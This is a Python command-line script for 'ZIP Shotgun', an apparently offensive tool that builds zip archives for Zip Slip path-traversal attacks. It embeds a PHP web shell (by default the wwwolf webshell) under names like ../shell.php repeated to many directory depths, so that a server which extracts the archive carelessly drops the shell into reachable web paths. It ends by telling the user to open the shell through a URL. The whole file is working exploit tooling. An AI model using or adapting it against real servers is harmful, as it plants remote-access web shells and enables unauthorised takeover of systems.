import logging
from zipfile import ZipFile

import click

from zip_shotgun.zip_shotugn_utils.utils import get_random_shell_name, get_default_shell_code_and_extension, get_user_provided_shell_code_and_extension, \
    save_file_to_zip_archive

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])
APP_NAME = 'ZIP Shotgun'
VERSION = '1.0.0'

HELP_MSG_DIRECTORIES_COUNT = 'Count of how many directories to go back inside the zip file (e.g 3 means that 3 files will be added to the zip: ' \
                             'shell.php, ../shell.php and ../../shell.php where shell.php is the name of the shell you provided or randomly generated value'
HELP_MSG_SHELL_NAME = 'Name of the shell inside the generated zip file (e.g shell). If not provided it will be randomly generated. Cannot have whitespaces'
HELP_MSG_SHELL_FILE_PATH = 'A file that contains code for the shell. If this option is not provided ' \
                           'wwwolf (https://github.com/WhiteWinterWolf/wwwolf-php-webshell) php shell will be added instead. ' \
                           'If name is provided it will be added to the zip with the provided name or if not provided the name will be randomly generated.'
HELP_MSG_COMPRESS = 'Enable compression. If this flag is set archive will be compressed using DEFALTE algorithm with compression level of 9. ' \
                    'By default there is no compression applied.'

RANDOM_SHELL_NAME_LENGTH = 16

LOGGING_FORMAT = '%(asctime)s | %(levelname)8s | %(message)s'
LOGGING_TIME_AND_DATE_FORMAT = '%d/%b/%Y %a %H:%M:%S %z'

logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT, datefmt=LOGGING_TIME_AND_DATE_FORMAT)


@click.command(context_settings=CONTEXT_SETTINGS)
@click.version_option(version=VERSION, prog_name=APP_NAME)
@click.argument('output_zip_file', type=click.Path(writable=True, resolve_path=True))
@click.option('-c', '--directories-count', show_default=True, default=16, required=False, type=int, help=HELP_MSG_DIRECTORIES_COUNT)
@click.option('-n', '--shell-name', show_default=False, default=None, required=False, type=str, help=HELP_MSG_SHELL_NAME)
@click.option('-f', '--shell-file-path', show_default=False, default=None, required=False, type=click.Path(exists=True, resolve_path=True),
              help=HELP_MSG_SHELL_FILE_PATH)
@click.option('--compress', is_flag=True, help=HELP_MSG_COMPRESS)
def zip_shotgun_cli(output_zip_file, directories_count, shell_name, shell_file_path, compress):
    logging.info(f'Opening output zip file: {output_zip_file}')
    with ZipFile(output_zip_file, 'w') as output_zip:

        if shell_name is None:  # Shell name was not provided. Generate random name
            shell_name = get_random_shell_name(RANDOM_SHELL_NAME_LENGTH)

        if shell_file_path is None:  # Shell file was not provided. Using default shell code and extension
            shell_code, file_extension = get_default_shell_code_and_extension()
        else:  # Get user provided shell code and extract file extension from user file
            shell_code, file_extension = get_user_provided_shell_code_and_extension(shell_file_path)

        if compress:
            logging.info('--compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9')
        else:
            logging.info('--compress flag was NOT set. Archive will be uncompressed. Files will be only stored.')

        for i in range(directories_count):
            base_directory = '../' * i  # if iteration is 0 it will return empty string
            file_name_in_archive = f'{base_directory}{shell_name}.{file_extension}'
            save_file_to_zip_archive(output_zip, file_name_in_archive, shell_code, compress)

    logging.info(f'Finished. Try to access shell using {shell_name}.{file_extension} in the URL')


if __name__ == '__main__':
    zip_shotgun_cli()
